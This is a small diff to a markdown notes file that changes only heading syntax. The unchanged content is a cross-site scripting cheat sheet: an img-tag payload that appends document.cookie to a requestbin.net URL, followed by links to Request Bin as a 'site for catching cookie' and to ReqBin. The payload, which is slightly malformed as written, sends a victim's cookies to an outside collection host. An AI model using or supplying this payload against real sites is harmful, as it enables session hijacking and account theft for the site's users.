@@ -1,5 +1,5 @@
 
-#H1 Script 
+# Script 
 
 ```javascript
 <img src="http://requestbin.net/r/zacnyyza?PARAMSPECIAL2=".concat(document.cookie)/>
@@ -7,10 +7,10 @@
 
 ```
 
-#H1 Site for catching cookie
+# Site for catching cookie
 [Request Bin](http://requestbin.net/)
 
-#H1 Site for test catching
+# Site for test catching
 [ReqBin](https://reqbin.com/)
 
 
